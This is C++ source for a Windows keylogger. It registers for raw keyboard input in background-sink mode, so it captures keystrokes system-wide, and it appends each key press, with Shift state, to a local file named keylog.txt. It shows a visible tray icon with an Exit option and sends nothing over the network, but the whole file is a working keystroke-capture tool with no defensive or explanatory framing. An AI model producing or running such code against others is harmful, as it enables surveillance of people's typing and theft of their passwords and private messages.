#define UNICODE
#include <windows.h>
#include <fstream>
#include <map>
#include <shellapi.h>
#include <string>

using namespace std;

LRESULT CALLBACK WindowProc(HWND, UINT, WPARAM, LPARAM);
void ProcessRawInput(LPARAM);

ofstream logFile("keylog.txt", ios::app);
map<int, string> codes = {
    {8, "Backspace"}, {9, "Tab"}, {13, "Enter"}, {16, "Shift"}, {17, "Ctrl"},
    {18, "Alt"}, {27, "Esc"}, {32, "Space"}, {37, "Left"}, {38, "Up"},
    {39, "Right"}, {40, "Down"}, {46, "Delete"}, {48, "0"}, {49, "1"},
    {50, "2"}, {51, "3"}, {52, "4"}, {53, "5"}, {54, "6"}, {55, "7"},
    {56, "8"}, {57, "9"}, {65, "A"}, {66, "B"}, {67, "C"}, {68, "D"},
    {69, "E"}, {70, "F"}, {71, "G"}, {72, "H"}, {73, "I"}, {74, "J"},
    {75, "K"}, {76, "L"}, {77, "M"}, {78, "N"}, {79, "O"}, {80, "P"},
    {81, "Q"}, {82, "R"}, {83, "S"}, {84, "T"}, {85, "U"}, {86, "V"},
    {87, "W"}, {88, "X"}, {89, "Y"}, {90, "Z"}
};

bool shift = false;

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    const wchar_t CLASS_NAME[] = L"Keylogger";

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInst;
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"Keylogger", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, hInst, NULL);

    if (!hwnd) return 0;

    // Tray icon
    NOTIFYICONDATA nid = { sizeof(nid), hwnd, 1, NIF_ICON | NIF_TIP | NIF_MESSAGE, 0x8001 };
    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wcscpy_s(nid.szTip, L"Keylogger");
    Shell_NotifyIcon(NIM_ADD, &nid);

    // Register raw input
    RAWINPUTDEVICE rid = { 1, 6, RIDEV_INPUTSINK, hwnd };
    RegisterRawInputDevices(&rid, 1, sizeof(rid));

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_INPUT) ProcessRawInput(lp);
    else if (msg == WM_DESTROY) PostQuitMessage(0);
    else if (msg == 0x8001 && lp == WM_RBUTTONUP) {
        POINT pt; GetCursorPos(&pt);
        HMENU menu = CreatePopupMenu();
        AppendMenu(menu, MF_STRING, 1, L"Exit");
        SetForegroundWindow(hwnd);
        if (TrackPopupMenu(menu, TPM_RETURNCMD, pt.x, pt.y, 0, hwnd, NULL) == 1)
            PostQuitMessage(0);
        DestroyMenu(menu);
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

void ProcessRawInput(LPARAM lp) {
    UINT size;
    GetRawInputData((HRAWINPUT)lp, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
    RAWINPUT raw;
    GetRawInputData((HRAWINPUT)lp, RID_INPUT, &raw, &size, sizeof(RAWINPUTHEADER));

    if (raw.header.dwType == RIM_TYPEKEYBOARD) {
        auto key = raw.data.keyboard.VKey;
        bool down = !(raw.data.keyboard.Flags & RI_KEY_BREAK);

        if (down) {
            if (key == 16) shift = true;
            logFile << (shift ? "(S) " : "")
                << (codes.count(key) ? codes[key] : to_string(key))
                << endl;
        }
        else if (key == 16) {
            shift = false;
        }
    }
}
